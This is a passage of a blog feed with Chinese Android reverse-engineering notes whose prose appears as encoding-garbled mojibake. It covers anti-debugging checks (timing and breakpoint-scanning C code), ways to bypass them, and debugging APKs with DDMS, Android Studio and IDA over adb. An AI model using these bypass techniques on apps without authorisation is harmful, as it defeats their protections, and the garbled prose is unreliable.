è¯¥å±æ€§åˆä½äºboot.imgé•œåƒä¸­çš„/default.propæ–‡ä»¶ä¸­ï¼Œå‰è€…åœ¨è®¾å¤‡å¼€æœºå‰ç”±ramdisk æŒ‚è½½ã€‚å› æ­¤å¯ä»¥ä¿®æ”¹boot.imgä»è€Œä¿®æ”¹ro.debugableå±æ€§ä½¿å¾—è®¾å¤‡å…¨å±€å¯è°ƒè¯•ã€‚<a href="https://www.cnblogs.com/codex/p/12250647.html">è¯¥é¡¹ä¿®æ”¹</a>å¯é€šè¿‡MagiskåŠå…¶æ¨¡å—MagiskHide Props Configå®ç°ã€‚</p></li></ul><h3 id="0x01-isDebuggerConnected"><a href="#0x01-isDebuggerConnected" class="headerlink" title="0x01.isDebuggerConnected()"></a>0x01.isDebuggerConnected()</h3><p>Android SDKä¸­çš„android.os.debugç±»æä¾›äº†ä¸€ä¸ªisDebuggerConnectedæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºåˆ¤æ–­JDWPè°ƒè¯•å™¨æ˜¯å¦æ­£åœ¨å·¥ä½œã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LYmZT.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LYmZT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>å¯é€šè¿‡ä¿®æ”¹smaliä»£ç è¿›è¡Œç»•è¿‡ã€‚</p><h3 id="0x02-æ—¶é—´æˆ³æ£€æµ‹"><a href="#0x02-æ—¶é—´æˆ³æ£€æµ‹" class="headerlink" title="0x02.æ—¶é—´æˆ³æ£€æµ‹"></a>0x02.æ—¶é—´æˆ³æ£€æµ‹</h3><p>æ­£å¸¸æƒ…å†µä¸‹ç¨‹åºè¿è¡Œæ—¶å–ä¸¤ä¸ªæ—¶é—´æˆ³ï¼Œä¸¤è€…å·®å€¼è¾ƒå°ã€‚ä½†è‹¥æ˜¯åœ¨debugçŠ¶æ€ä¸‹ï¼Œæ—¶é—´å·®å€¼ä¼šè¶…å‡ºæ­£å¸¸å€¼ï¼Œè‹¥æ’é™¤ç¨‹åºå¡é¡¿å·²ç»bugçš„æƒ…å†µä¸‹å¯ä»¥æ–­å®šappå¤„äºdebugçŠ¶æ€ã€‚Expï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">anti_time</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> pid = getpid();</span><br><span class="line"> struct timeval t1;</span><br><span class="line"> struct timeval t2;</span><br><span class="line"> struct timezone tz;</span><br><span class="line"> gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line"> gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line"> <span class="keyword">int</span> timeoff = (t2.tv_sec) - (t1.tv_sec);</span><br><span class="line"> LOGD(<span class="string">&quot;time %d&quot;</span>,timeoff);</span><br><span class="line"> <span class="keyword">if</span> (timeoff &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-æ–­ç‚¹æ£€æµ‹"><a href="#0x03-æ–­ç‚¹æ£€æµ‹" class="headerlink" title="0x03.æ–­ç‚¹æ£€æµ‹"></a>0x03.æ–­ç‚¹æ£€æµ‹</h3><p>ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¼šå°†elfæ–‡ä»¶(ä½¿ç”¨soçš„æƒ…å†µä¸‹)å¯¼å…¥å¯¼å…¥å†…å­˜ä¸­ï¼Œå¦‚æœå­˜åœ¨æ–­ç‚¹ï¼Œå†…å­˜ä¸­ä¹Ÿä¼šæ”¹å˜ç›¸åº”çš„æŒ‡ä»¤ï¼Œç•™ä¸‹thumbæˆ–è€…armçš„æ–­ç‚¹æŒ‡ä»¤çš„æœºå™¨ç ã€‚åˆ©ç”¨æŒ‡é’ˆéå†å†…å­˜ä¸­elfæ–‡ä»¶åˆ¤æ–­æœ‰æ— ä¸Šè¿°æœºå™¨ç ï¼Œå³å¯åˆ¤æ–­æœ‰æ— æ–­ç‚¹ï¼Œè¿›è€Œåˆ¤æ–­æ˜¯å¦å¤„äºdebugã€‚Expï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">anti_breakpoint</span><span class="params">()</span></span>&#123;</span><br><span class="line">Elf32_Ehdr *elfhdr;</span><br><span class="line">Elf32_Phdr *pht;</span><br><span class="line">unsigned <span class="keyword">int</span> size, base, offset,phtable;</span><br><span class="line"><span class="keyword">int</span> n, i,j;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line"><span class="comment">//ä»mapsä¸­è¯»å–elfæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€</span></span><br><span class="line">base = GetLibAddr();</span><br><span class="line"><span class="keyword">if</span>(base == <span class="number">0</span>)&#123;</span><br><span class="line">LOGD(<span class="string">&quot;find base error/n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">elfhdr = (Elf32_Ehdr *) base;</span><br><span class="line">phtable = elfhdr-&gt;e_phoff + base;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;elfhdr-&gt;e_phnum;i++)&#123;</span><br><span class="line">pht = (Elf32_Phdr*)(phtable+i*sizeof(Elf32_Phdr));</span><br><span class="line">    <span class="keyword">if</span>(pht-&gt;p_flags&amp;<span class="number">1</span>)&#123;</span><br><span class="line">    offset = pht-&gt;p_vaddr + base + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr)*elfhdr-&gt;e_phnum;</span><br><span class="line">        LOGD(<span class="string">&quot;offset:%#x ,len:%#x&quot;</span>,offset,pht-&gt;p_memsz);</span><br><span class="line">        p = (<span class="keyword">char</span>*)offset;</span><br><span class="line">        size = pht-&gt;p_memsz;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>,n=<span class="number">0</span>;j&lt;size;++j,++p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*p == <span class="number">0x10</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xde</span>)&#123;</span><br><span class="line">        n++;</span><br><span class="line">                LOGD(<span class="string">&quot;### find thumb bpt %#x /n&quot;</span>,p);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(*p == <span class="number">0xf0</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xf7</span> &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x00</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xa0</span>)&#123;</span><br><span class="line">                n++;</span><br><span class="line">                LOGD(<span class="string">&quot;### find thumb2 bpt %#x /n&quot;</span>,p);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(*p == <span class="number">0x01</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0x00</span> &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x9f</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xef</span>)&#123;</span><br><span class="line">                n++;</span><br><span class="line">                LOGD(<span class="string">&quot;### find arm bpt %#x /n&quot;</span>,p);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        LOGD(<span class="string">&quot;### find breakpoint num: %d/n&quot;</span>,n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apk åŠ¨è°ƒ</title>
      <link href="2021/03/01/APK%E5%8A%A8%E8%B0%83/"/>
      <url>2021/03/01/APK%E5%8A%A8%E8%B0%83/</url>
      
        <content type="html"><![CDATA[<p>Javaå±‚ä¸Nativeå±‚çš„åŠ¨è°ƒè°ƒè¯•ã€‚<span id="more"></span></p><h1 id="DDMS-javaå±‚"><a href="#DDMS-javaå±‚" class="headerlink" title="DDMS(javaå±‚)"></a>DDMS(javaå±‚)</h1><h2 id="ä¸»è¦åŠŸèƒ½"><a href="#ä¸»è¦åŠŸèƒ½" class="headerlink" title="ä¸»è¦åŠŸèƒ½"></a>ä¸»è¦åŠŸèƒ½</h2><img src="https://z3.ax1x.com/2021/03/25/6L8TOK.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8TOK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 47%;" /><h2 id="æ’æ¡©-logè¾“å‡º"><a href="#æ’æ¡©-logè¾“å‡º" class="headerlink" title="æ’æ¡©-logè¾“å‡º"></a>æ’æ¡©-logè¾“å‡º</h2><ol><li>åˆ©ç”¨AndroidKillerä¿®æ”¹apkåŒ…ï¼Œåœ¨éœ€è¦æ’æ¡©çš„ä»£ç å¤„å³é”®logè¾“å‡ºï¼Œå¡«å…¥è°ƒè¯•æ—¶éœ€è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚</li><li>æ‰“åŒ…å®‰è£…åˆ°è®¾å¤‡ã€‚</li><li>ddmsä¸­æ‰¾åˆ°ç¨‹åºå¯¹åº”çš„activityï¼Œè¿‡æ»¤æ‰¾åˆ°è¾“å‡ºä¿¡æ¯ã€‚</li><li>æ ¹æ®è¾“å‡ºä¿¡æ¯çš„æ—¶é—´æˆ³æ‰¾åˆ°ä¸Šä¸‹æ–‡ï¼Œå¾—åˆ°æ–¹æ³•è°ƒç”¨å±‚æ¬¡ã€‚</li></ol><h2 id="æ ˆè·Ÿè¸ª-stacktrace"><a href="#æ ˆè·Ÿè¸ª-stacktrace" class="headerlink" title="æ ˆè·Ÿè¸ª-stacktrace"></a>æ ˆè·Ÿè¸ª-stacktrace</h2><ol><li>åˆ©ç”¨AndroidKillerä¿®æ”¹apkåŒ…ï¼Œåœ¨éœ€è¦æ’æ¡©å¤„å³é”®stacktraceï¼Œå¡«å…¥è°ƒè¯•æ—¶éœ€è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚</li><li>å®‰è£…æ‰“å¼€ï¼Œç”¨ddmsè¿‡æ»¤è¾“å‡ºä¿¡æ¯ã€‚</li><li>æ ¹æ®è¾“å‡ºä¿¡æ¯çš„æ—¶é—´æˆ³æ‰¾åˆ°ä¸Šä¸‹æ–‡ï¼Œè‡ªä¸‹è€Œä¸Šå¾—åˆ°æ–¹æ³•è°ƒç”¨å±‚æ¬¡ã€‚</li></ol><img src="https://z3.ax1x.com/2021/03/25/6L85S1.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L85S1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><h2 id="æ–¹æ³•åˆ†æ"><a href="#æ–¹æ³•åˆ†æ" class="headerlink" title="æ–¹æ³•åˆ†æ"></a>æ–¹æ³•åˆ†æ</h2><ol><li>DDMSå¤„æ‰“å¼€æ–¹æ³•åˆ†æå¹¶é™åˆ¶åˆ†æçš„æ–¹æ³•æ•°ã€‚</li><li>ç‚¹å‡»okåï¼Œç«‹å³åœ¨è®¾å¤‡ä¸Šå®ç°éœ€è¦åˆ†æçš„åŠŸèƒ½ã€‚</li><li>åŠŸèƒ½å®ç°åç«‹å³ç‚¹å‡»åœæ­¢æ–¹æ³•åˆ†æã€‚</li><li>ç­‰å¾…æ–¹æ³•åˆ†æçª—å£æ‰“å¼€ã€‚</li><li>ä»»æ„æ–¹æ³•å‡å¯é€šè¿‡ä¸‹æ‹‰é¡¹æŸ¥çœ‹ä¸Šå±‚(parents)å’Œä¸‹å±‚(Children)çš„è°ƒç”¨æ–¹æ³•ã€‚</li></ol><p><img src="https://z3.ax1x.com/2021/03/25/6L8IQx.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8IQx.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 43%;" /><img src="https://z3.ax1x.com/2021/03/25/6L8oy6.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8oy6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 58%;" /></p><h1 id="Android-Studio-Smalide-javaå±‚"><a href="#Android-Studio-Smalide-javaå±‚" class="headerlink" title="Android Studio + Smalide(javaå±‚)"></a>Android Studio + Smalide(javaå±‚)</h1><h2 id="è¿œç¨‹è°ƒè¯•"><a href="#è¿œç¨‹è°ƒè¯•" class="headerlink" title="è¿œç¨‹è°ƒè¯•"></a>è¿œç¨‹è°ƒè¯•</h2><ol><li>åœ¨AndroidKillerä¸­æ‰“å¼€apkæ–‡ä»¶ï¼Œç”¨ASå¯¼å…¥è¯¥å·¥ç¨‹æ–‡ä»¶å¤¹</li><li>åœ¨smaliæ–‡ä»¶ä¸­è®¾ç½®è°ƒè¯•æ–­ç‚¹</li><li>åœ¨â€œè¿è¡Œ-ç¼–è¾‘é…ç½®â€ä¸­æ–°å»ºâ€œremoteâ€ç±»å‹é…ç½®ï¼Œè®¾ç½®å¥½è°ƒè¯•å™¨åç§°å’Œç«¯å£</li><li>è¿æ¥è®¾å¤‡ï¼Œæ‰“å¼€éœ€è¦è°ƒè¯•çš„ç¨‹åºï¼Œç”¨â€œadb shell psâ€å‘½ä»¤æ‰¾åˆ°éœ€è¦è°ƒè¯•çš„è¿›ç¨‹</li><li>ç”¨â€œadb forward tcp:10001 jdwp:3523â€å‘½ä»¤è¿œç¨‹è¿æ¥ï¼Œå…¶ä¸­â€tcp:â€åå¡«å…¥è°ƒè¯•ç«¯å£å·ï¼Œâ€jdwpâ€åå¡«å…¥éœ€è¦è°ƒè¯•è¿›ç¨‹çš„pid</li><li>åœ¨å·¥å…·æ å¤„é€‰æ‹©è¿œç¨‹è°ƒè¯•é…ç½®ï¼Œç‚¹å‡»çˆ¬è™«iconè¿›è¡Œè°ƒè¯•</li></ol><p><img src="https://z3.ax1x.com/2021/03/25/6L8HeO.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8HeO.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><img src="https://z3.ax1x.com/2021/03/25/6L8bwD.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8bwD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:47%;" /><h1 id="IDA-Pro-Nativeå±‚"><a href="#IDA-Pro-Nativeå±‚" class="headerlink" title="IDA Pro(Nativeå±‚)"></a>IDA Pro(Nativeå±‚)</h1><h2 id="è¿œç¨‹è°ƒè¯•-1"><a href="#è¿œç¨‹è°ƒè¯•-1" class="headerlink" title="è¿œç¨‹è°ƒè¯•"></a>è¿œç¨‹è°ƒè¯•</h2><p>å°†android_server(64) pushåˆ°è®¾å¤‡ä¸­ï¼Œchmodèµ‹äºˆæƒé™å¹¶è¿è¡Œã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L8qTe.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8qTe.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>åœ¨terminalä¸­ç”¨adbè¿›è¡Œç«¯å£è½¬å‘ã€‚é»˜è®¤ç«¯å£<strong>23946</strong>ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L82o4.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L82o4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>åˆ©ç”¨å‘½ä»¤ä½¿ç¨‹åºæŒ‚èµ·ï¼Œæ­¤æ—¶å¯åœ¨è®¾å¤‡ä¸­çœ‹è§â€œWarnningâ€çª—å£ã€‚</p><blockquote><p>adb shell am start -D -n åŒ…å/åŒ…å+ç±»å</p></blockquote><img src="https://z3.ax1x.com/2021/03/25/6L8gwF.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8gwF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png" class="lazyload" data-srcset="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png"></p><p>æ‰“å¼€ddmså¯ä»¥å‘ç°è¢«æŒ‚èµ·çš„è¿›ç¨‹åä¹‹å‰å‡ºç°çº¢è™«è™«ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L8yLT.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8yLT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>æ‰“å¼€IDAè¿›è¡Œattachï¼Œé€‰æ‹©è¿›ç¨‹ï¼Œè¿›å…¥è°ƒè¯•çª—å£ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L8ceU.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8ceU.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p><img src="https://z3.ax1x.com/2021/03/25/6L8syV.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8syV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>å‹¾é€‰ä¸‰ä¸ªè°ƒè¯•å™¨é€‰é¡¹ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼Œçº¿ç¨‹å¯åŠ¨ç»ˆæ­¢ï¼Œåº“åŠ è½½å¸è½½ï¼‰ï¼ŒF9è¿è¡Œï¼Œæ­¤æ—¶æ ‡é¢˜æ˜¾ç¤ºâ€œrunningâ€ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L8WFJ.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8WFJ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>é‡Šæ”¾ç¨‹åºï¼Œæ­¤æ—¶åœ¨ddmsä¸­å‘ç°çº¢è™«è™«å˜ç»¿è™«è™«ï¼Œæ­¤æ—¶ç¨‹åºä¸­çš„æç¤ºçª—å£æ¶ˆå¤±ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6L8fY9.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8fY9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>åœ¨IDAçš„æ¨¡å—çª—å£æœç´¢ï¼Œè‹¥æœªå‘ç°ç›®æ ‡åº“åˆ™ç»§ç»­è¿è¡Œï¼Œéšåå³å¯å‘ç°ç›®æ ‡åº“è¢«åŠ è½½åˆ°IDAï¼Œå¼€å§‹è°ƒè¯•ã€‚</p><img src="https://z3.ax1x.com/2021/03/25/6L8hWR.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8hWR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>Command Listï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./data/user/tmp/as</span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br><span class="line">adb shell am start -D -n åŒ…å/åŒ…å+ç±»å</span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=pid</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NDKå¼€å‘</title>
      <link href="2021/02/27/NDK%E5%BC%80%E5%8F%91/"/>
      <url>2021/02/27/NDK%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>ç”¨C/C++å¼€å‘Android<span id="more"></span></p><p>Androidå·¥ç¨‹ä¸€èˆ¬ç”±javaè¯­è¨€ç¼–å†™ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡NDKè°ƒç”¨nativeæ–¹æ³•æ¥æ‰§è¡ŒC/C++çš„ä»£ç ï¼Œåè€…ä»£ç ä¸­çš„æ ‡è¯†ç¬¦éœ€è¦åœ¨å·¥ç¨‹ä¸­è¿›è¡Œæ³¨å†Œï¼Œä»¥ä¾¿åœ¨javaè¢«ä¸€ä¸€å¯¹åº”åœ°æ‰¾åˆ°å¹¶æ­£ç¡®è°ƒç”¨ã€‚ä¸‹é¢ä»‹ç»å…³äºnativeæ–¹æ³•çš„å¼€å‘è¿‡ç¨‹ã€‚</p><h2 id="å¼€å‘æµç¨‹"><a href="#å¼€å‘æµç¨‹" class="headerlink" title="å¼€å‘æµç¨‹"></a>å¼€å‘æµç¨‹</h2><h3 id="ç¼–å†™-java"><a href="#ç¼–å†™-java" class="headerlink" title="ç¼–å†™.java"></a>ç¼–å†™.java</h3><p>åœ¨javaæ–‡ä»¶ä¸­å£°æ˜éœ€è¦ç”¨åˆ°çš„nativeå‡½æ•°ï¼Œæ— éœ€ç¼–å†™æ–¹æ³•ä½“ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LQGEd.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQGEd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>å£°æ˜åæ’å…¥å¦‚ä¸‹ä»£ç ï¼Œä»¥ä¾¿è¿è¡Œæ—¶åŠ è½½nativeåº“ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 